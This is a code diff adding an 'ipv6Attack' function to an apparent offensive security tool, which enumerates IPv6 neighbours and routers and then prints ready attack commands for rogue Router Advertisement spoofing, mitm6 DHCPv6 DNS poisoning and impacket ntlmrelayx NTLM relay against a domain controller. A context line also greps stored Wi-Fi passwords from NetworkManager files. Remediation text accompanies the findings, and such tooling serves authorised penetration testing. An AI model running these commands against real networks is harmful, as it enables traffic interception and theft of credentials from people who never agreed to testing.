@@ -588,3 +588,184 @@ grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null | head -5
 
   return { output: output.join("\n"), findings }
 }
+
+export async function ipv6Attack(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["[*] IPv6 network attacks — RA spoofing, DHCPv6 poisoning, SLAAC abuse\n"]
+
+  const action = argVal(args, "--action") || "scan"
+  const iface = argVal(args, "--interface") || "eth0"
+  const target = argVal(args, "--target")
+  const domain = argVal(args, "--domain")
+
+  const exec = activeExec === "sh" ? sh : bash
+
+  const ipv6Check = await exec(`ip -6 addr show dev ${iface} 2>/dev/null || ifconfig ${iface} 2>/dev/null | grep inet6`, timeout)
+  if (ipv6Check.stdout.trim()) {
+    output.push("[+] IPv6 addresses on interface:")
+    output.push(ipv6Check.stdout.trim())
+    output.push("")
+  }
+
+  const neighborDisc = await exec(`ip -6 neigh show dev ${iface} 2>/dev/null || ndp -an 2>/dev/null`, timeout)
+  if (neighborDisc.stdout.trim()) {
+    const neighbors = neighborDisc.stdout.trim().split("\n").filter(Boolean)
+    output.push(`[+] IPv6 neighbors discovered: ${neighbors.length}`)
+    for (const n of neighbors) output.push(`    ${n}`)
+    output.push("")
+
+    if (neighbors.length > 0) {
+      findings.push({
+        checkId: "LNX-NET-IPV6-NEIGH",
+        provider: "linuxhook",
+        severity: "MEDIUM",
+        status: "FOUND",
+        resource: iface,
+        title: `${neighbors.length} IPv6 neighbors discovered`,
+        details: `IPv6 neighbor discovery on ${iface} found ${neighbors.length} hosts. These are potential targets for RA spoofing and DHCPv6 attacks.`,
+        remediation: "Implement RA Guard (IEEE 802.1Dj). Enable DHCPv6 Guard on switches. Use SEcure Neighbor Discovery (SEND).",
+      })
+    }
+  }
+
+  const routerDisc = await exec(`rdisc6 ${iface} 2>/dev/null || ndisc6 -1 ff02::2%${iface} 2>/dev/null`, timeout)
+  if (routerDisc.stdout.trim()) {
+    output.push("[+] IPv6 routers discovered:")
+    output.push(routerDisc.stdout.trim())
+    output.push("")
+  }
+
+  if (action === "scan") {
+    const linkLocal = await exec(`ping6 -c 3 -I ${iface} ff02::1 2>/dev/null | grep 'from' | awk '{print $4}' | tr -d ':' | sort -u`, timeout)
+    if (linkLocal.stdout.trim()) {
+      const hosts = linkLocal.stdout.trim().split("\n").filter(Boolean)
+      output.push(`[+] Link-local multicast scan — ${hosts.length} hosts responded:`)
+      for (const h of hosts) output.push(`    ${h}`)
+      output.push("")
+    }
+
+    const multicast = await exec(`ip -6 maddr show dev ${iface} 2>/dev/null`, timeout)
+    if (multicast.stdout.trim()) {
+      output.push("[+] Multicast groups:")
+      output.push(multicast.stdout.trim())
+      output.push("")
+    }
+  }
+
+  if (action === "ra_spoof") {
+    const hasFake = await exec("command -v fake_router6 || command -v atk6-fake_router6", timeout)
+    const hasScapy = await exec("command -v scapy || python3 -c 'import scapy' 2>/dev/null && echo ok", timeout)
+    const hasRaSpoof = hasFake.exitCode === 0
+    const hasScapyAvail = hasScapy.exitCode === 0
+
+    if (hasRaSpoof) {
+      output.push("[+] fake_router6 available (thc-ipv6 suite)")
+      output.push(`    Attack: fake_router6 ${iface} <attacker-ipv6> — inject rogue Router Advertisement`)
+      output.push("    Effect: Victims add attacker as default gateway → full MITM on IPv6 traffic")
+      output.push("")
+    }
+
+    if (hasScapyAvail) {
+      output.push("[+] Scapy available — can craft custom RA packets")
+      output.push("    Scapy RA template ready")
+      output.push("")
+    }
+
+    if (!hasRaSpoof && !hasScapyAvail) {
+      output.push("[!] No RA spoofing tools found (need thc-ipv6 or scapy)")
+      output.push("    Install: apt install thc-ipv6 || pip3 install scapy")
+    }
+
+    findings.push({
+      checkId: "LNX-NET-IPV6-RA",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: hasRaSpoof || hasScapyAvail ? "READY" : "TOOL_MISSING",
+      resource: iface,
+      title: "IPv6 Router Advertisement spoofing",
+      details: `RA spoofing on ${iface} can redirect all IPv6 traffic through attacker. ${hasRaSpoof ? "fake_router6 available." : ""} ${hasScapyAvail ? "Scapy available." : ""}`,
+      remediation: "Enable RA Guard on all switch ports. Deploy SEND (RFC 3971). Monitor ICMPv6 Type 134 packets.",
+    })
+  }
+
+  if (action === "dhcpv6") {
+    const hasMitm6 = await exec("command -v mitm6", timeout)
+    const hasDhcp6 = await exec("command -v dhcp6 || command -v atk6-fake_dhcps6 || command -v fake_dhcps6", timeout)
+
+    if (hasMitm6.exitCode === 0) {
+      output.push("[+] mitm6 available — DHCPv6 + DNS spoofing")
+      const cmd = domain ? `mitm6 -i ${iface} -d ${domain}` : `mitm6 -i ${iface}`
+      output.push(`    Attack: ${cmd}`)
+      output.push("    Effect: Poison DHCPv6 → set attacker as DNS server → relay NTLM to LDAP/HTTP")
+      output.push("    Pair with: impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker-wpad")
+      output.push("")
+    }
+
+    if (hasDhcp6.exitCode === 0) {
+      output.push("[+] fake_dhcps6 available (thc-ipv6 suite)")
+      output.push(`    Attack: fake_dhcps6 ${iface} <attacker-ipv6> <dns-ipv6>`)
+      output.push("")
+    }
+
+    if (hasMitm6.exitCode !== 0 && hasDhcp6.exitCode !== 0) {
+      output.push("[!] No DHCPv6 attack tools found")
+      output.push("    Install: pip3 install mitm6 || apt install thc-ipv6")
+    }
+
+    findings.push({
+      checkId: "LNX-NET-IPV6-DHCP",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: hasMitm6.exitCode === 0 ? "READY" : "TOOL_MISSING",
+      resource: iface,
+      title: "DHCPv6 DNS poisoning",
+      details: `DHCPv6 spoofing on ${iface} can override DNS server for all IPv6 clients. Windows prefers IPv6 → effective even on IPv4 networks. ${hasMitm6.exitCode === 0 ? "mitm6 available." : ""}`,
+      remediation: "Enable DHCPv6 Guard on switches. Block ICMPv6 Type 134 at network edge. Disable IPv6 if not needed.",
+    })
+  }
+
+  if (action === "slaac") {
+    output.push("[*] SLAAC (Stateless Address Autoconfiguration) abuse")
+    output.push("    SLAAC allows hosts to auto-configure IPv6 addresses from Router Advertisements")
+    output.push("    Attack: Send RA with attacker-controlled prefix → hosts auto-configure on attacker's subnet")
+    output.push("")
+
+    const sysctl = await exec("sysctl -a 2>/dev/null | grep 'net.ipv6.conf' | grep -E 'accept_ra|autoconf|forwarding'", timeout)
+    if (sysctl.stdout.trim()) {
+      output.push("[+] IPv6 sysctl configuration:")
+      const lines = sysctl.stdout.trim().split("\n")
+      for (const line of lines.slice(0, 20)) output.push(`    ${line}`)
+      if (lines.length > 20) output.push(`    ... and ${lines.length - 20} more`)
+      output.push("")
+
+      const acceptRa = lines.filter((l) => l.includes("accept_ra") && l.includes("= 1"))
+      if (acceptRa.length > 0) {
+        findings.push({
+          checkId: "LNX-NET-IPV6-SLAAC",
+          provider: "linuxhook",
+          severity: "MEDIUM",
+          status: "VULNERABLE",
+          resource: iface,
+          title: `${acceptRa.length} interfaces accepting Router Advertisements`,
+          details: "Interfaces with accept_ra=1 will auto-configure IPv6 addresses from any RA sender. Attacker can inject rogue prefix to redirect traffic.",
+          remediation: "Set net.ipv6.conf.*.accept_ra=0 on server interfaces. Use static IPv6 configuration.",
+        })
+      }
+    }
+  }
+
+  if (findings.length === 0) {
+    findings.push({
+      checkId: "LNX-NET-IPV6-SCAN",
+      provider: "linuxhook",
+      severity: "LOW",
+      status: "INFO",
+      resource: iface,
+      title: "IPv6 network scan completed",
+      details: `IPv6 reconnaissance on ${iface} completed. Use --action ra_spoof|dhcpv6|slaac for active attacks.`,
+      remediation: "Review IPv6 security posture. Consider RA Guard, DHCPv6 Guard, and SEND.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
